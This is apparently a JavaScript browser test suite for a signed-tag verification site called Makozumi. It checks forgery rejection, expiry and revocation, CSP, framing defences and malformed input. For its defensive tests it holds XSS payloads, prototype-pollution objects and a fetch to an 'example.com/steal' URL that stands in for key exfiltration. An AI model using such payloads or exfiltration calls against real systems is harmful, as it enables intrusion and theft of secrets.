#!/usr/bin/env node
// ============================================================
// Makozumi attack suite.
//
// Builds genuine and hostile codes, then runs each one against the real
// pages in a real browser. Every check here corresponds to a row in
// security.html — if a defence is claimed there, it is proven here.
//
//   node tests/attack-suite.mjs
//
// The issuing private key is NEVER stored in this repository. Provide it
// only when you want the full run:
//   MAKOZUMI_PRIVATE_JWK='{"kty":"EC",...}' node tests/attack-suite.mjs
//   # or place it in .secrets/issuer.jwk (git-ignored)
// Without it, the forgery, malformed-input, and page-defence checks still
// run; only the checks that need a genuine signature are skipped.
// ============================================================

import { chromium } from 'playwright-core';
import { generateKeyPairSync, createSign, createPrivateKey } from 'node:crypto';
import { readFileSync, existsSync, writeFileSync, mkdtempSync, cpSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { createServer } from 'node:http';

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..');
const CHROME =
  process.env.MAKOZUMI_CHROME ||
  ['/opt/pw-browsers/chromium-1194/chrome-linux/chrome', '/opt/pw-browsers/chromium/chrome-linux/chrome']
    .find((p) => existsSync(p));

// ---------- issuing key (optional) --------------------------

function loadIssuerKey() {
  const raw =
    process.env.MAKOZUMI_PRIVATE_JWK ||
    (existsSync(join(ROOT, '.secrets/issuer.jwk')) ? readFileSync(join(ROOT, '.secrets/issuer.jwk'), 'utf8') : '');
  if (!raw.trim()) return null;
  try {
    return createPrivateKey({ key: JSON.parse(raw), format: 'jwk' });
  } catch (e) {
    console.error('Could not read the issuing key:', e.message);
    return null;
  }
}

const issuer = loadIssuerKey();
const attacker = generateKeyPairSync('ec', { namedCurve: 'P-256' }).privateKey;
const b64u = (b) => Buffer.from(b).toString('base64url');

function sign(jsonText, key) {
  const payloadB64 = b64u(Buffer.from(jsonText, 'utf8'));
  const s = createSign('SHA256');
  s.update(Buffer.from(payloadB64, 'utf8'));
  const sigB64 = b64u(s.sign({ key, dsaEncoding: 'ieee-p1363' }));
  return { token: `${payloadB64}.${sigB64}`, payloadB64, sigB64 };
}
const real = (json) => sign(json, issuer);
const base = (over = {}) =>
  JSON.stringify({ v: 2, kid: 'k1', sn: 'MKZ-T000', p: 'Test Item', t: 'Widget', o: 'Test Issuer', d: '2026-01-01', ...over });

// ---------- static server -----------------------------------

const stage = mkdtempSync(join(tmpdir(), 'makozumi-test-'));
for (const f of ['index.html', 'generate.html', 'how-it-works.html', 'security.html']) {
  cpSync(join(ROOT, f), join(stage, f));
}
cpSync(join(ROOT, 'assets'), join(stage, 'assets'), { recursive: true });
// Revocation fixture: the suite needs a known-revoked serial.
writeFileSync(join(stage, 'revoked.json'), JSON.stringify({ updated: '2026-01-01', revoked: ['MKZ-TREVOKED'] }));

const TYPES = { '.html': 'text/html; charset=utf-8', '.js': 'text/javascript; charset=utf-8', '.json': 'application/json' };
const server = createServer((req, res) => {
  const path = decodeURIComponent(req.url.split('?')[0]);
  const file = join(stage, path === '/' ? 'index.html' : path);
  if (!file.startsWith(stage) || !existsSync(file)) { res.writeHead(404); return res.end('not found'); }
  const ext = file.slice(file.lastIndexOf('.'));
  res.writeHead(200, { 'Content-Type': TYPES[ext] || 'application/octet-stream' });
  res.end(readFileSync(file));
});
await new Promise((r) => server.listen(0, '127.0.0.1', r));
const ORIGIN = `http://127.0.0.1:${server.address().port}`;
const PAGE = ORIGIN + '/index.html';

// ---------- harness -----------------------------------------

let pass = 0, fail = 0, skip = 0;
const failures = [];
const report = (name, ok, detail = '') => {
  if (ok) { pass++; console.log('  ok   ' + name); }
  else { fail++; failures.push(`${name} — ${detail}`); console.log(`  FAIL ${name} — ${detail}`); }
};
const skipped = (name) => { skip++; console.log('  skip ' + name + ' (no issuing key)'); };

const browser = await chromium.launch({ executablePath: CHROME });
const ctx = await browser.newContext();
const page = await ctx.newPage();
const pageErrors = [];
const external = [];
page.on('pageerror', (e) => pageErrors.push(String(e)));
page.on('request', (r) => {
  const u = new URL(r.url());
  if (u.origin !== ORIGIN && u.protocol !== 'data:') external.push(r.url());
});

async function settle(p = page) {
  await p.waitForFunction(
    () => { const t = document.getElementById('status')?.textContent || ''; return t && !t.includes('CHECKING'); },
    { timeout: 8000 }
  ).catch(() => {});
  return p.evaluate(() => ({
    status: document.getElementById('status').textContent.replace(/\s+/g, ' ').trim(),
    infoVisible: !document.getElementById('info').classList.contains('hidden'),
    info: document.getElementById('info-list').textContent.replace(/\s+/g, ' ').trim(),
    xss: window.__xss || null, xss2: window.__xss2 || null,
    polluted: ({}).polluted || null, polluted2: ({}).polluted2 || null,
  }));
}
const tap = async (code) => { await page.goto(PAGE + '#' + code, { waitUntil: 'load' }); return settle(); };
async function expectTap(name, code, want, mustNot = []) {
  const s = await tap(code);
  report(name, s.status.includes(want) && mustNot.every((m) => !s.status.includes(m)), `status "${s.status.slice(0, 90)}"`);
  return s;
}
const needsKey = (name, fn) => (issuer ? fn() : Promise.resolve(skipped(name)));

// ---------- genuine ------------------------------------------
console.log('\n— genuine codes must pass —');
await needsKey('genuine code verifies', async () => {
  const s = await expectTap('genuine code verifies', real(base()).token, 'AUTHENTIC', ['NOT']);
  report('genuine code shows its details', s.infoVisible && s.info.includes('Test Item'), s.info.slice(0, 80));
});
await needsKey('genuine code with a future expiry', () =>
  expectTap('genuine code with a future expiry', real(base({ exp: '2099-01-01' })).token, 'AUTHENTIC', ['NOT']));
await needsKey('legacy v1 code (no kid) still verifies', () =>
  expectTap('legacy v1 code (no kid) still verifies',
    real('{"v":1,"sn":"MKZ-LEGACY","p":"Old Item","t":"Notebook","o":"Test Issuer","d":"2026-01-01"}').token,
    'AUTHENTIC', ['NOT']));

// ---------- forgery ------------------------------------------
console.log('\n— forgery must fail —');
await expectTap('signed with an attacker key', sign(base(), attacker).token, 'NOT AUTHENTIC');
await needsKey('payload edited after signing', async () => {
  const g = real(base());
  const obj = JSON.parse(Buffer.from(g.payloadB64, 'base64url').toString());
  obj.o = 'Someone Else';
  await expectTap('payload edited after signing', b64u(JSON.stringify(obj)) + '.' + g.sigB64, 'NOT AUTHENTIC');
});
await needsKey('signature lifted from another code', async () => {
  const a = real(base({ sn: 'MKZ-A' })), b = real(base({ sn: 'MKZ-B' }));
  await expectTap('signature lifted from another code', a.payloadB64 + '.' + b.sigB64, 'NOT AUTHENTIC');
});
await needsKey('malformed signature sizes', async () => {
  const g = real(base());
  const sig = Buffer.from(g.sigB64, 'base64url');
  await expectTap('signature truncated to 32 bytes', g.payloadB64 + '.' + b64u(sig.subarray(0, 32)), 'NOT AUTHENTIC');
  await expectTap('signature doubled to 128 bytes', g.payloadB64 + '.' + b64u(Buffer.concat([sig, sig])), 'NOT AUTHENTIC');
  await expectTap('all-zero signature', g.payloadB64 + '.' + b64u(Buffer.alloc(64)), 'NOT AUTHENTIC');
});
for (const [label, kid] of [['unknown', '"evil"'], ['numeric', '999'], ['object', '{"a":1}'],
                            ['constructor', '"constructor"'], ['__proto__', '"__proto__"'], ['toString', '"toString"']]) {
  await needsKey(`key id: ${label}`, () =>
    expectTap(`key id: ${label}`, real(`{"v":2,"kid":${kid},"sn":"MKZ-K","p":"X","o":"Y"}`).token, 'NOT AUTHENTIC'));
}

// ---------- hostile content signed by the real key ------------
console.log('\n— hostile content must never execute —');
await needsKey('script payloads', async () => {
  let s = await tap(real(base({ sn: 'MKZ-XSS', p: '<img src=x onerror="window.__xss=1">' })).token);
  report('img/onerror payload does not run', s.xss === null, 'window.__xss was set');
  report('img/onerror payload rendered as literal text', s.info.includes('<img'), s.info.slice(0, 60));
  s = await tap(real(base({ sn: 'MKZ-XSS2', p: '</dd><script>window.__xss2=1<\/script>' })).token);
  report('script-tag payload does not run', s.xss2 === null, 'window.__xss2 was set');
});
await needsKey('text-direction override stripped', async () => {
  const s = await tap(real(base({ sn: 'MKZ-BIDI', p: 'Genuine‮koobeton‬' })).token);
  report('text-direction override stripped', !s.info.includes('‮'), 'RLO survived into the page');
});
await needsKey('over-long field truncated', async () => {
  const s = await tap(real(base({ sn: 'MKZ-LONG', p: 'Z'.repeat(400) })).token);
  report('over-long field truncated', s.info.includes('…') && s.info.length < 1200, `length ${s.info.length}`);
});
await needsKey('prototype pollution', async () => {
  let s = await tap(real('{"v":2,"kid":"k1","sn":"MKZ-PP","p":"P","o":"I","__proto__":{"polluted":"yes"}}').token);
  report('__proto__ payload does not pollute', s.polluted === null, 'Object.prototype polluted');
  s = await tap(real('{"v":2,"kid":"k1","sn":"MKZ-CP","p":"C","o":"I","constructor":{"prototype":{"polluted2":"yes"}}}').token);
  report('constructor payload does not pollute', s.polluted2 === null, 'Object.prototype polluted');
});
await needsKey('structurally wrong payloads', async () => {
  await expectTap('over-sized payload rejected', real(base({ n: 'x'.repeat(4000) })).token, 'NOT');
  await expectTap('array payload rejected', real('[1,2,3]').token, 'NOT');
  await expectTap('string payload rejected', real('"a string"').token, 'NOT');
  await expectTap('null payload rejected', real('null').token, 'NOT');
  await expectTap('unknown future version', real(base({ v: 99 })).token, 'CANNOT CHECK');
  await expectTap('signed but no item name', real('{"v":2,"kid":"k1","sn":"MKZ-N","o":"I"}').token, 'CANNOT CHECK');
  await expectTap('signed but no serial', real('{"v":2,"kid":"k1","p":"N","o":"I"}').token, 'CANNOT CHECK');
  await expectTap('signed but empty', real('{}').token, 'CANNOT CHECK');
});

// ---------- lifecycle ----------------------------------------
console.log('\n— expiry and revocation —');
await needsKey('expired code', () => expectTap('expired code', real(base({ sn: 'MKZ-EXP', exp: '2020-01-01' })).token, 'EXPIRED'));
await needsKey('revoked serial', () => expectTap('revoked serial', real(base({ sn: 'MKZ-TREVOKED' })).token, 'REVOKED'));
await needsKey('revocation outranks expiry', () =>
  expectTap('revocation outranks expiry', real(base({ sn: 'MKZ-TREVOKED', exp: '2020-01-01' })).token, 'REVOKED'));

// ---------- malformed input ----------------------------------
console.log('\n— malformed input fails cleanly —');
await expectTap('no dot separator', 'abcdefghijklmnop', 'NOT');
await expectTap('invalid base64', '!!!nope!!!.$$$$', 'NOT');
await expectTap('payload is not JSON', b64u('not json') + '.' + b64u(Buffer.alloc(64)), 'NOT');
await expectTap('empty payload half', '.' + b64u(Buffer.alloc(64)), 'NOT');
await expectTap('empty signature half', b64u('{}') + '.', 'NOT');
await expectTap('40 000-character input', 'A'.repeat(20000) + '.' + 'B'.repeat(20000), 'NOT');
await needsKey('three parts', () => expectTap('three parts', real(base()).token + '.extra', 'NOT'));

// ---------- usability ----------------------------------------
console.log('\n— everyday use still works —');
{
  await page.goto(PAGE, { waitUntil: 'load' });
  let s = await settle();
  report('no code shows the idle screen', s.status.includes('TAP A TAG') && !s.infoVisible, s.status.slice(0, 60));
  await page.fill('#code-input', '   ');
  await page.click('#verify-btn');
  s = await settle();
  report('empty paste claims no result', s.status.includes('TAP A TAG'), s.status.slice(0, 60));
}
await needsKey('paste and URL forms', async () => {
  const t = real(base()).token;
  await page.goto(PAGE, { waitUntil: 'load' });
  await page.fill('#code-input', '  ' + t.slice(0, 40) + '\n  ' + t.slice(40) + '  ');
  await page.click('#verify-btn');
  let s = await settle();
  report('pasted code with stray whitespace verifies', s.status.includes('AUTHENTIC') && !s.status.includes('NOT'), s.status.slice(0, 60));

  await page.fill('#code-input', 'https://katsuma0.github.io/makozumi/#' + t);
  await page.click('#verify-btn');
  s = await settle();
  report('pasted full tag link verifies', s.status.includes('AUTHENTIC') && !s.status.includes('NOT'), s.status.slice(0, 60));

  await page.goto(PAGE + '#' + encodeURIComponent(t), { waitUntil: 'load' });
  s = await settle();
  report('percent-encoded fragment verifies', s.status.includes('AUTHENTIC') && !s.status.includes('NOT'), s.status.slice(0, 60));

  await page.goto(PAGE + '?c=' + t, { waitUntil: 'load' });
  s = await settle();
  report('?c= query form verifies', s.status.includes('AUTHENTIC') && !s.status.includes('NOT'), s.status.slice(0, 60));

  await page.goto(PAGE + '#' + t, { waitUntil: 'load' });
  await settle();
  await page.evaluate((x) => { location.hash = '#' + x; }, sign(base(), attacker).token);
  s = await settle();
  report('tapping a second tag re-checks it', s.status.includes('NOT AUTHENTIC'), s.status.slice(0, 60));
});

// ---------- page-level defences ------------------------------
console.log('\n— page defences —');
{
  await page.goto(PAGE, { waitUntil: 'load' });
  const origin = await page.textContent('#origin');
  report('the address strip names the site', /Local preview|Official site|not the official/.test(origin), origin.slice(0, 70));
}
{
  const framer = await ctx.newPage();
  await framer.setContent(`<h1>Fake Shop</h1><iframe src="${PAGE}" width="400" height="600"></iframe>`, { waitUntil: 'load' });
  await framer.waitForTimeout(900);
  const frame = framer.frames().find((f) => f.url().includes('index.html'));
  const hidden = frame ? await frame.evaluate(() => document.getElementById('app').classList.contains('hidden')) : false;
  const text = frame ? await frame.evaluate(() => document.body.innerText) : '';
  report('refuses to run inside a frame', hidden && /not safe|open it directly/i.test(text), text.slice(0, 70));
  await framer.close();
}
{
  const csp = await page.getAttribute('meta[http-equiv="Content-Security-Policy"]', 'content');
  const need = ["default-src 'none'", "script-src 'self'", "frame-ancestors 'none'", "base-uri 'none'", "form-action 'none'"];
  const missing = need.filter((n) => !csp.includes(n));
  report('verifier policy is strict', missing.length === 0, 'missing: ' + missing.join(', '));
}
{
  const gen = await ctx.newPage();
  await gen.goto(ORIGIN + '/generate.html', { waitUntil: 'load' });
  const net = await gen.evaluate(async () => {
    try { await fetch('https://example.com/steal'); return 'ALLOWED'; } catch { return 'BLOCKED'; }
  });
  report('issuing tool cannot reach the network (key cannot be exfiltrated)', net === 'BLOCKED', net);
  await gen.close();
}
{
  const noCrypto = await ctx.newPage();
  await noCrypto.addInitScript(() => {
    try { Object.defineProperty(window.crypto, 'subtle', { get: () => undefined, configurable: true }); } catch {}
  });
  await noCrypto.goto(PAGE + '#' + sign(base(), attacker).token, { waitUntil: 'load' });
  await noCrypto.waitForTimeout(1200);
  const st = (await noCrypto.textContent('#status')).replace(/\s+/g, ' ').trim();
  report('a browser without WebCrypto fails honestly', st.includes('CANNOT CHECK') && !st.includes('CHECKING'), st.slice(0, 70));
  await noCrypto.close();
}
report('nothing is loaded from third parties', external.length === 0, external.join(', '));
report('no uncaught page errors in the whole run', pageErrors.length === 0, pageErrors.slice(0, 2).join(' | '));

// ---------- issuing round trip -------------------------------
await needsKey('issuing round trip', async () => {
  console.log('\n— issuing round trip —');
  const jwk = JSON.parse(process.env.MAKOZUMI_PRIVATE_JWK || readFileSync(join(ROOT, '.secrets/issuer.jwk'), 'utf8'));
  const gen = await ctx.newPage();
  await gen.goto(ORIGIN + '/generate.html', { waitUntil: 'load' });
  await gen.fill('#privkey', JSON.stringify(jwk));
  await gen.fill('#p', 'Round Trip Item');
  await gen.fill('#t', 'Ceramic');
  await gen.fill('#o', 'Test Issuer');
  await gen.fill('#sn', 'MKZ-RT01');
  await gen.click('#go');
  await gen.waitForTimeout(400);
  report('issuing produced no error', !(await gen.textContent('#err')).trim(), await gen.textContent('#err'));
  const code = await gen.inputValue('#code');
  report('chip capacity is reported', /NTAG2\d\d|too long/.test(await gen.textContent('#note')), '');

  await gen.fill('#privkey', JSON.stringify({ kty: jwk.kty, crv: jwk.crv, x: jwk.x, y: jwk.y }));
  await gen.click('#go');
  await gen.waitForTimeout(300);
  report('issuing refuses a public key', (await gen.textContent('#err')).includes('public key'), await gen.textContent('#err'));
  await gen.close();

  await page.goto(PAGE + '#' + code.trim(), { waitUntil: 'load' });
  const s = await settle();
  report('a freshly issued code verifies', s.status.includes('AUTHENTIC') && !s.status.includes('NOT'), s.status.slice(0, 70));
  report('every issued field is shown', s.info.includes('Round Trip Item') && s.info.includes('MKZ-RT01'), s.info.slice(0, 90));
});

await browser.close();
server.close();

console.log(`\n${pass} passed, ${fail} failed${skip ? `, ${skip} skipped` : ''}`);
if (fail) { console.log('\nFAILURES:'); failures.forEach((f) => console.log(' - ' + f)); }
process.exit(fail ? 1 : 0);
